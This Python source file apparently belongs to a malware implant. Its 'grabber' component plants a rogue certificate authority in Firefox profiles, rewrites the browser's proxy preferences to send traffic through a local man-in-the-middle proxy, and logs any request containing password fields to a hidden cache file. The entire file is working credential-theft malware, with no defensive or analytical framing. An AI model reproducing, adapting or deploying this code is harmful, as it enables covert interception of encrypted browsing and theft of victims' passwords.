
import random
import time
import os
import string
import threading
from core import *
import re
import base64

from binaries import *
from miproxy.proxy import RequestInterceptorPlugin, ResponseInterceptorPlugin, AsyncMitmProxy

# The grbber installs a rouge cert into Firefox profiles and alters the proxy settings
# to route web traffic through the implant
class GrabberThread(threading.Thread):
	proxy = None

	# Constuctor for the grabber
	def __init__(self):
		threading.Thread.__init__(self)
		debug("grabber", "Initialized")
		global KeyPath
		global PROXY_PORT
		global DRMCA_PEM

		# Write the PEM file into pos for the proxy server
		try:
			os.chdir(KeyPath)
			with open("drmca.pem", "w") as handle:
				handle.write(base64.b64decode(DRMCA_PEM))
				debug("grabber", "wrote certificate authority")
		except:
			debug("grabber", "Could not change dirs or write trusted CA key.")
		time.sleep(3)

		self.proxy = AsyncMitmProxy(server_address=("0.0.0.0", PROXY_PORT))
		self.proxy.register_interceptor(GrabberInterceptor)

		# Configure Firefox for scraping
		try:
			profilesDir = os.getenv('APPDATA') + "\\Mozilla\\Firefox\\Profiles\\"
			for dirname, subdirs, filelist in os.walk(profilesDir):
				for filename in filelist:
					if (filename == "cert8.db"):
						debug("grabber", "install drmca")
						os.chdir(dirname)
						drmca = base64.b64decode(DRMCA_CERT8)
						with open(filename, "wb") as handle:
							handle.write(drmca)
					if (filename == "prefs.js"):
						# Read from the prefs file to see if we need to make changes
						os.chdir(dirname)
						prefsContent = ""
						with open(filename, "r") as handle:
							prefsContent = handle.read()

						# Write missing lines from pref.js config (user privs :)
						debug("grabber", "altering firefox prefs")
						with open(filename, "a") as handle:
							if not "user_pref(\"network.proxy.http_port\", 9001);" in prefsContent:
								debug("grabber", "Firefox prefs write port")
								handle.write("user_pref(\"network.proxy.http_port\", 9001);\n") #todo
							if not "user_pref(\"network.proxy.http\", \"127.0.0.1\");" in prefsContent:
								debug("grabber", "Firefox prefs write proxy")
								handle.write("user_pref(\"network.proxy.http\", \"127.0.0.1\");\n")
							if not "user_pref(\"network.proxy.type\", 1);" in prefsContent:
								debug("grabber", "Firefox prefs write connection type")
								handle.write("user_pref(\"network.proxy.type\", 1);\n")
		except Exception as e:
			debug("grabber", "some other grabber error HAS HAPPENED -> %s" % str(e))

	def run(self):
		try:
			while (True):
				try:
					debug("grabber", "proxy started")
					self.proxy.serve_forever()
				except KeyboardInterrupt:
					self.proxy.server_close()
				time.sleep(random.randint(1, 4))
		except Exception as e:
			pass

class GrabberInterceptor(RequestInterceptorPlugin, ResponseInterceptorPlugin):

		def do_request(self, data):
			creds = ""
			if "password=" in data:
				creds = data[256:]
			if "pw=" in data:
				creds = data[256:]
			if "pass=" in data:
				creds = data[256:]
			if "passwd=" in data:
				creds = data[256:]
			if (creds):
				try:
					os.chdir(KeyPath)
					with open("grabcache", "a") as handle:
						handle.write(creds)
				except Exception as e:
					debug("grabber", "write content fail -> %s" % str(e))
			return data

		def do_response(self, data):
			return data